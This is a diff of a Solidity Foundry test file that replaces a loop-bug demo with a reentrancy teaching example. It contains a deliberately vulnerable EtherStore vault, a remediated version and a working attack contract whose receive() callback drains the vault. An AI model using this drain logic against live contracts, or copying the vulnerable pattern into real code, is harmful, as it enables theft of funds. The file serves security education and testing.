@@ -4,254 +4,127 @@ pragma solidity ^0.8.18;
 import "forge-std/Test.sol";
 
 /*
-Name: Use of return in inner loop iteration leads to unintended termination. 
+Name: Reentrancy Vulnerability
 
 Description:
-This demonstrates the difference between using 'return' and 'break' in nested loop iterations.
-When removing multiple banks from a list, using 'return' in the BuggyBankManager will prematurely exit the function
-after removing only the first bank, leaving other banks untouched.
-In contrast, the FixedBankManager uses 'break' correctly to only exit the current inner loop iteration,
-allowing the outer loop to continue processing other banks.
+The EtherStore Reentrancy Vulnerability is a flaw in the smart contract design that allows 
+an attacker to exploit reentrancy and withdraw more funds than they are entitled to from the EtherStore contract. 
+The vulnerability arises due to the withdrawFunds function in the EtherStore contract,
+where the Ether is transferred to the attacker's address before updating their balance. 
+This allows the attacker's contract to make a reentrant call back to the withdrawFunds function before the balance update, 
+leading to multiple withdrawals and potentially draining all the Ether from the EtherStore contract.
 
-This is similar to a real bug where a function intended to allow the removal of multiple DEXes approved for swaps,
-but would only remove the first DEX because 'return' was used instead of 'break' in the inner for loop.
+Scenario:
+EtherStore is a simple vault, it can manage everyone's ethers.
+But it's vulnerable, can you steal all the ethers ?
 
-Mitigation:  
-Use break instead of return when you only want to exit the current loop, not the entire function.
+Mitigation:
+Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.
 
-REF:
-https://twitter.com/1nf0s3cpt/status/1678596730865221632
-https://github.com/code-423n4/2022-03-lifinance-findings/issues/34
-https://solidity-by-example.org/loop/
+REF
+https://slowmist.medium.com/introduction-to-smart-contract-vulnerabilities-reentrancy-attack-2893ec8390a
+https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/
+
 */
 
+contract EtherStore {
+    mapping(address => uint256) public balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdrawFunds(uint256 _weiToWithdraw) public {
+        require(balances[msg.sender] >= _weiToWithdraw);
+        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
+        require(send, "send failed");
+
+        // check if after send still enough to avoid underflow
+        if (balances[msg.sender] >= _weiToWithdraw) {
+            balances[msg.sender] -= _weiToWithdraw;
+        }
+    }
+}
+
+contract EtherStoreRemediated {
+    mapping(address => uint256) public balances;
+    bool internal locked;
+
+    modifier nonReentrant() {
+        require(!locked, "No re-entrancy");
+        locked = true;
+        _;
+        locked = false;
+    }
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdrawFunds(uint256 _weiToWithdraw) public nonReentrant {
+        require(balances[msg.sender] >= _weiToWithdraw);
+        balances[msg.sender] -= _weiToWithdraw;
+        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
+        require(send, "send failed");
+    }
+}
+
 contract ContractTest is Test {
-    BuggyBankManager buggyManager;
-    FixedBankManager fixedManager;
+    EtherStore store;
+    EtherStoreRemediated storeRemediated;
+    EtherStoreAttack attack;
+    EtherStoreAttack attackRemediated;
 
     function setUp() public {
-        buggyManager = new BuggyBankManager();
-        fixedManager = new FixedBankManager();
-        
-        // Initialize both managers with the same 3 banks
-        address[] memory initialBanks = new address[](3);
-        string[] memory initialNames = new string[](3);
-        
-        initialBanks[0] = address(0x1);
-        initialNames[0] = "ABC Bank";
-        
-        initialBanks[1] = address(0x2);
-        initialNames[1] = "XYZ Bank";
-        
-        initialBanks[2] = address(0x3);
-        initialNames[2] = "Global Bank";
-        
-        buggyManager.addBanks(initialBanks, initialNames);
-        fixedManager.addBanks(initialBanks, initialNames);
-        
-        // Verify initial state
-        emit log_string("Initial state of both bank managers:");
-        emit log_named_uint("Buggy manager bank count", buggyManager.getBankCount());
-        emit log_named_uint("Fixed manager bank count", fixedManager.getBankCount());
+        store = new EtherStore();
+        storeRemediated = new EtherStoreRemediated();
+        attack = new EtherStoreAttack(address(store));
+        attackRemediated = new EtherStoreAttack(address(storeRemediated));
+        vm.deal(address(store), 5 ether);
+        vm.deal(address(storeRemediated), 5 ether);
+        vm.deal(address(attack), 2 ether);
+        vm.deal(address(attackRemediated), 2 ether);
     }
 
-    function testReturnVsBreak() public {
-        // Try to remove all banks marked for removal
-        emit log_string("\nRemoving banks marked for removal");
-        
-        // Mark all banks for removal
-        address[] memory banksToRemove = new address[](3);
-        banksToRemove[0] = address(0x1); // ABC Bank
-        banksToRemove[1] = address(0x2); // XYZ Bank
-        banksToRemove[2] = address(0x3); // Global Bank
-        console.log("------------Testing buggyManager---------------");
-        // With buggy implementation (using return)
-        buggyManager.removeBanksWithReturn(banksToRemove);
-        emit log_named_uint("Buggy manager (with return) bank count after removal", buggyManager.getBankCount());
-        buggyManager.listBanks();
+    function testReentrancy() public {
+        attack.Attack();
+    }
 
-        console.log("------------Testing FixedBankManager---------------");
-        // With fixed implementation (using break)
-        fixedManager.removeBanksWithBreak(banksToRemove);
-        emit log_named_uint("Fixed manager (with break) bank count after removal", fixedManager.getBankCount());
-        fixedManager.listBanks();
+    function test_RevertRemediated() public {
+        attackRemediated.Attack();
     }
 }
 
-// Base contract with common functionality
-contract BankManager {
-    struct Bank {
-        address bankAddress;
-        string bankName;
+contract EtherStoreAttack is Test {
+    EtherStore store;
+
+    constructor(address _store) {
+        store = EtherStore(_store);
     }
 
-    Bank[] public banks;
-    
-    // Add multiple banks
-    function addBanks(address[] memory addresses, string[] memory names) public {
-        require(addresses.length == names.length, "Arrays must have the same length");
-        
-        for (uint i = 0; i < addresses.length; i++) {
-            banks.push(Bank(addresses[i], names[i]));
-        }
-    }
-    
-    // Get the number of banks
-    function getBankCount() public view returns (uint) {
-        return banks.length;
-    }
-    
-    // Get a specific bank
-    function getBank(uint index) public view returns (address, string memory) {
-        require(index < banks.length, "Index out of bounds");
-        return (banks[index].bankAddress, banks[index].bankName);
-    }
-    
-    // Helper function to remove a bank at a specific index
-    function _removeBank(uint index) internal {
-        require(index < banks.length, "Index out of bounds");
-        
-        // Move the last element to the deleted position
-        if (index < banks.length - 1) {
-            banks[index] = banks[banks.length - 1];
-        }
-        
-        // Remove the last element
-        banks.pop();
-    }
-}
+    function Attack() public {
+        console.log("EtherStore balance", address(store).balance);
 
-// Buggy implementation using 'return' incorrectly
-contract BuggyBankManager is BankManager, Test {
-    // Remove all banks in the provided list
-    // BUG: Using 'return' causes premature exit after removing only one bank
-    function removeBanksWithReturn(address[] memory banksToRemove) public {
-        for (uint i = 0; i < banks.length; i++) {
-            for (uint j = 0; j < banksToRemove.length; j++) {
-                if (banks[i].bankAddress == banksToRemove[j]) {
-                    emit log_string(string(abi.encodePacked(
-                        "Removing bank: ", banks[i].bankName, 
-                        " (Address: ", toHexString(uint160(banks[i].bankAddress)), ")"
-                    )));
-                    
-                    _removeBank(i);
-                    return; // BUG: This exits the entire function after removing just one bank
-                }
-            }
-        }
-    }
-    
-    // Helper function to list all banks in this manager
-    function listBanks() public {
-        emit log_string("Banks in buggy manager:");
-        for (uint i = 0; i < banks.length; i++) {
-            emit log_string(string(abi.encodePacked(
-                "Bank ", toString(i), ": ", 
-                banks[i].bankName, " (Address: ", 
-                toHexString(uint160(banks[i].bankAddress)), ")"
-            )));
-        }
-    }
-    
-    // Helper function to convert uint to string
-    function toString(uint value) internal pure returns (string memory) {
-        if (value == 0) {
-            return "0";
-        }
-        uint temp = value;
-        uint digits;
-        while (temp != 0) {
-            digits++;
-            temp /= 10;
-        }
-        bytes memory buffer = new bytes(digits);
-        while (value != 0) {
-            digits -= 1;
-            buffer[digits] = bytes1(uint8(48 + uint(value % 10)));
-            value /= 10;
-        }
-        return string(buffer);
-    }
-    
-    // Helper function to convert address to hex string
-    function toHexString(uint value) internal pure returns (string memory) {
-        bytes16 hexSymbols = "0123456789abcdef";
-        uint length = 40; // 20 bytes * 2 characters per byte
-        bytes memory buffer = new bytes(2 + length);
-        buffer[0] = '0';
-        buffer[1] = 'x';
-        for (uint i = 2 + length - 1; i >= 2; i--) {
-            buffer[i] = hexSymbols[value & 0xf];
-            value >>= 4;
-        }
-        return string(buffer);
-    }
-}
+        store.deposit{value: 1 ether}();
 
-// Fixed implementation using proper iteration
-contract FixedBankManager is BankManager, Test {
-    // Remove all banks in the provided list
-    // FIXED: Using proper iteration to remove multiple elements
-    function removeBanksWithBreak(address[] memory banksToRemove) public {
-        // We need to iterate backwards to avoid index issues when removing elements
-        for (int i = int(banks.length) - 1; i >= 0; i--) {
-            for (uint j = 0; j < banksToRemove.length; j++) {
-                if (banks[uint(i)].bankAddress == banksToRemove[j]) {
-                    emit log_string(string(abi.encodePacked(
-                        "Removing bank: ", banks[uint(i)].bankName, 
-                        " (Address: ", toHexString(uint160(banks[uint(i)].bankAddress)), ")"
-                    )));
-                    
-                    _removeBank(uint(i));
-                    break; // FIXED: Only break from the inner loop, continue with the next bank
-                }
-            }
-        }
+        console.log(
+            "Deposited 1 Ether, EtherStore balance",
+            address(store).balance
+        );
+        store.withdrawFunds(1 ether); // exploit here
+
+        console.log("Attack contract balance", address(this).balance);
+        console.log("EtherStore balance", address(store).balance);
     }
-    
-    // Helper function to list all banks in this manager
-    function listBanks() public {
-        emit log_string("Banks in fixed manager:");
-        for (uint i = 0; i < banks.length; i++) {
-            emit log_string(string(abi.encodePacked(
-                "Bank ", toString(i), ": ", 
-                banks[i].bankName, " (Address: ", 
-                toHexString(uint160(banks[i].bankAddress)), ")"
-            )));
+
+    // fallback() external payable {}
+
+    // we want to use fallback function to exploit reentrancy
+    receive() external payable {
+        console.log("Attack contract balance", address(this).balance);
+        console.log("EtherStore balance", address(store).balance);
+        if (address(store).balance >= 1 ether) {
+            store.withdrawFunds(1 ether); // exploit here
         }
-    }
-    
-    // Helper function to convert uint to string
-    function toString(uint value) internal pure returns (string memory) {
-        if (value == 0) {
-            return "0";
-        }
-        uint temp = value;
-        uint digits;
-        while (temp != 0) {
-            digits++;
-            temp /= 10;
-        }
-        bytes memory buffer = new bytes(digits);
-        while (value != 0) {
-            digits -= 1;
-            buffer[digits] = bytes1(uint8(48 + uint(value % 10)));
-            value /= 10;
-        }
-        return string(buffer);
-    }
-    
-    // Helper function to convert address to hex string
-    function toHexString(uint value) internal pure returns (string memory) {
-        bytes16 hexSymbols = "0123456789abcdef";
-        uint length = 40; // 20 bytes * 2 characters per byte
-        bytes memory buffer = new bytes(2 + length);
-        buffer[0] = '0';
-        buffer[1] = 'x';
-        for (uint i = 2 + length - 1; i >= 2; i--) {
-            buffer[i] = hexSymbols[value & 0xf];
-            value >>= 4;
-        }
-        return string(buffer);
     }
 }
